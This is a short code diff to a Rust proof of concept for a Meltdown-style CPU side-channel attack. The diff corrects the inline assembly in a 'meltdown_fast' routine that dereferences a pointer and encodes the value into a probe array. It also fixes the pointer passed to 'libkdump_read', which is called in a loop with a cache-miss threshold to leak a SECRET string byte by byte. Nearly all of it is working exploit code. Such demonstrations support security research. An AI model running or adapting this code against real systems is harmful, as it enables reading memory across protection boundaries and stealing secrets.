@@ -23,9 +23,9 @@ pub struct Config {
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
     unsafe {
         asm!(
-            "mov {tmp} [{x}]",
-            "shl 12, {tmp}",
-            "mov {tmp2} [{base}+{tmp}]",
+            "mov {tmp}, [{x}]",
+            "shl {tmp}, 12",
+            "mov {tmp2}, [{base}+{tmp}]",
             x = in(reg) pointer,
             base = in(reg) &mem[0] as *const MemoryPage,
             tmp = out(reg) _,
@@ -176,7 +176,7 @@ pub fn main() {
     
     let mut index: usize = 0;
     while index < SECRET.len() {
-		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, &SECRET[index..index] as *const str);
+		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, SECRET[index..index].as_ptr());
 		println!("Got value: {}", value);
 		index += 1;
 	}
